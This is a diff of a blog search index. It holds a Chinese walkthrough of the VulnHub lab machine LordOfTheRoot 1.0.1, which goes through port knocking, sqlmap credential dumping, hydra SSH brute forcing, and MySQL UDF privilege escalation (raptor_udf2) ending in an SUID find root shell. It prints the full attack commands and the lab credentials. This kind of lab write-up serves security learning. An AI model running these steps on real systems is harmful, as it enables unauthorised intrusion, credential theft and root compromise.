@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
-    <url>/2021/04/21/LordOfTheRoot-1-0-1/</url>
+    <title>LordOfTheRoot_1.0.1</title>
+    <url>/2021/04/21/LordOfTheRoot_1.0.1/</url>
     <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>这是vulnhub靶场挑战的第七天！<span id="more"></span></p>
 <h3 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02  信息收集"></a>0x02  信息收集</h3><p>确定靶机地址</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">192.168.126.138 00:0c:29:47:9e:ab       VMware, Inc.</span><br></pre></td></tr></table></figure>
@@ -14,12 +14,12 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口碰撞：端口上的防火墙通过产生一组预先指定关闭的端口进行连接尝试，一旦接收到正确的连接尝试序列，防火墙规则就会动态修改，以允许发送连接尝试的主机通过特定端口进行连接。</span><br></pre></td></tr></table></figure>
 
 <p>使用ping冲撞3次试试</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/1.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/1.png"></p>
 <p>通过ping冲撞之后，防火墙规则会修改，重新扫描一次试试</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -A -T5 192.168.126.138</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">1337&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>
 
 <p>果然，发现一个1337的web端口，访问发现，只有一张图片</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/2.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/2.png"></p>
 <p>查看源代码，没有发现线索，访问robots.txt，也是一张图片，在源代码处发现线索</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</span><br></pre></td></tr></table></figure>
 
@@ -30,19 +30,19 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;Lzk3ODM0NTIxMC9pbmRleC5waHA&#x3D;&quot; | base64 -d                    </span><br><span class="line">&#x2F;978345210&#x2F;index.php </span><br></pre></td></tr></table></figure>
 
 <p>解密出来的，一看就是目录，访问，发现一个登陆页面</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/3.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/3.png"></p>
 <h3 id="0x03-SQL注入"><a href="#0x03-SQL注入" class="headerlink" title="0x03  SQL注入"></a>0x03  SQL注入</h3><p>突破点可能在这，想想登陆页面有啥漏洞，SQL注入或者弱口令进后台getshell，先进行注入测试</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.126.138:1337&#x2F;978345210&#x2F;index.php --form --batch --dbs</span><br></pre></td></tr></table></figure>
 
 <p>password参数存在注入，跑出4个数据库</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/4.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/4.png"></p>
 <p>查看Webapp数据库的表</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.126.138:1337&#x2F;978345210&#x2F;index.php --form --batch -D Webapp --tables</span><br></pre></td></tr></table></figure>
 
 <p>跑出Users数据表，读取Users表里内容</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.126.138:1337&#x2F;978345210&#x2F;index.php --form --batch -D Webapp -T &quot;Users&quot; --columns</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/5.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/5.png"></p>
 <p>读取username和password的值</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.126.138:1337&#x2F;978345210&#x2F;index.php --form --batch -D Webapp -T &quot;Users&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
 
@@ -51,14 +51,14 @@
 <p>将账号密码分别保存在txt文件里，想起刚才靶机开了22端口，尝试爆破</p>
 <h3 id="0x04-SSH爆破"><a href="#0x04-SSH爆破" class="headerlink" title="0x04  SSH爆破"></a>0x04  SSH爆破</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt -e nsr 192.168.126.138 ssh -t 64</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/6.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/6.png"></p>
 <p>得到账号密码：smeagol/MyPreciousR00t，并且成功登陆</p>
 <h3 id="0x05-内核提权"><a href="#0x05-内核提权" class="headerlink" title="0x05  内核提权"></a>0x05  内核提权</h3><p>确定版本为ubntu 14.04</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.3 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>
 
 <p>谷歌寻找exp</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/7.png"></p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/8.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/7.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/8.png"></p>
 <p>kali直接调用</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit 39166.c</span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39166.c &#x2F;root&#x2F;Desktop&#x2F;exp </span><br></pre></td></tr></table></figure>
 
@@ -70,20 +70,20 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:&#x2F;$ ps aux | grep mysql</span><br><span class="line">root      1175  0.0  4.2 326868 43292 ?        Ssl  04:00   0:04 &#x2F;usr&#x2F;sbin&#x2F;mysqld</span><br><span class="line">smeagol   4678  0.0  0.1   4692  2028 pts&#x2F;4    S+   06:41   0:00 grep --color&#x3D;auto mysql</span><br><span class="line">smeagol@LordOfTheRoot:&#x2F;$ mysql --version</span><br><span class="line">mysql  Ver 14.14 Distrib 5.5.44, for debian-linux-gnu (i686) using readline 6.3</span><br></pre></td></tr></table></figure>
 
 <p>现在还差数据库账号密码，去翻翻配置文件：root/darkshadow</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/11.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/11.png"></p>
 <p>kali利用searchsploit搜索mysql udf提权的exp</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/9.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/9.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c &#x2F;root&#x2F;Desktop&#x2F;exp</span><br></pre></td></tr></table></figure>
 
 <p>python开启http服务，将1518.c上传到靶机上smeagol用户目录下</p>
 <p>参照1518.c的用法</p>
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/10.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/10.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.126.135:8000&#x2F;1518.c</span><br><span class="line">mv 1518.c raptor_udf2.c &#x2F;&#x2F;重命名</span><br><span class="line">gcc -g -c raptor_udf2.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;create table foo(line blob);</span><br><span class="line">mysql&gt;insert into foo values(load_file(&#39;&#x2F;home&#x2F;smeagol&#x2F;raptor_udf2.so&#39;));&#x2F;&#x2F;这里要根据实际目录</span><br><span class="line">mysql&gt;select * from foo into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;raptor_udf2.so&#39;;&#x2F;&#x2F;这里要导入到mysql&#x2F;plugin目录下</span><br><span class="line">mysql&gt;create function do_system returns integer soname &#39;raptor_udf2.so&#39;;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| name      | ret | dl             | type     |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| do_system |   2 | raptor_udf2.so | function |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
 <p>这里跟着用法里的提权，一直没成功，nc反弹shell也没成功，还是跟着raven2靶场一样，使用find提权吧</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt;select do_system(&#39;chmod u+s &#x2F;usr&#x2F;bin&#x2F;find&#39;);</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">touch finn</span><br><span class="line">find finn -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/21/LordOfTheRoot-1-0-1/12.png"></p>
+<p><img src="/2021/04/21/LordOfTheRoot_1.0.1/12.png"></p>
 ]]></content>
       <categories>
         <category>靶场</category>
